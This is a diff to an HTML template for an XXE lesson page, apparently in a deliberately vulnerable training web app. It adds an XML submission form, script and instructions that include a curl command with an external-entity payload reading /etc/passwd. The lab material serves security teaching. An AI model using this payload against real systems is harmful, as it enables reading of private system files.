@@ -1,26 +1,50 @@
 {{define "template.xxe"}} {{template "template.header" .}} {{template "template.sidebar" .}}
 <div class="col-md-9">
     <div class="panel panel-primary">
-        <div class="panel-heading">XML Entity Injection</div>
+        <div class="panel-heading">XML External Entity (XXE) Injection</div>
         <div class="panel-body">
             <div class="pnl">
-                <!-- <span class="subheader">SQL Injection Vulnerability</span> -->
-                <p>The use of html template</p>
-                <p>Search vulnerability term, and you will get the explanation about the term:</p>
+                <p>Submit an XML payload — the server parses it and echoes back the <code>&lt;name&gt;</code> and <code>&lt;city&gt;</code> fields.</p>
+                <p>On the <strong>low</strong> level, raw XML is accepted with no content-type or size checks.<br>
+                   Try injecting an external entity payload via curl:</p>
+                <pre>curl -X POST {{.weburl}}xxe \
+  -H "Content-Type: application/xml" \
+  --data '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;city&gt;test&lt;/city&gt;&lt;/root&gt;'</pre>
                 <div class="well">
-                    <form class="form-inline">
-                    <div class="form-group">
-                        <label for="name" style="color:#428bca;font-family:Open Sans; font-weight:500">Enter a word:</label>
-                        <input type="text" class="form-control" name="term" id="term">
-                        <input type="submit" class="btn btn-small btn-primary" value="Search">
-                    </div>
-                   </form>
+                    <form method="POST" id="xxe-form">
+                        <div class="form-group">
+                            <label style="color:#428bca;font-family:Open Sans;font-weight:500">XML Payload:</label>
+                            <textarea class="form-control" name="xml_body" rows="6" placeholder="&lt;root&gt;&lt;name&gt;Alice&lt;/name&gt;&lt;city&gt;Berlin&lt;/city&gt;&lt;/root&gt;"></textarea>
+                        </div>
+                        <input type="submit" class="btn btn-primary" value="Submit XML">
+                    </form>
+                    {{if .error}}
+                    <div class="alert alert-danger" style="margin-top:10px">{{.error}}</div>
+                    {{end}}
+                    {{if .name}}
+                    <p style="margin-top:10px"><strong>Name:</strong> {{.name}}</p>
+                    <p><strong>City:</strong> {{.city}}</p>
+                    {{end}}
+                    {{if .raw}}
+                    <pre style="margin-top:5px">{{.raw}}</pre>
+                    {{end}}
                 </div>
+                <script>
+                document.getElementById('xxe-form').addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    var body = this.querySelector('[name=xml_body]').value;
+                    fetch(window.location.pathname, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/xml'},
+                        body: body
+                    }).then(function(r){ return r.text(); })
+                      .then(function(html){ document.open(); document.write(html); document.close(); });
+                });
+                </script>
                 <div class="more-info">
-                        <span>More Info :</span>
-                        <a target="_blank" href="https://excess-xss.com/">https://excess-xss.com/</a>
-                        <a target="_blank" href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a>
-                </div>    
+                    <span>More Info:</span>
+                    <a target="_blank" href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a>
+                </div>
             </div>
         </div>
     </div>
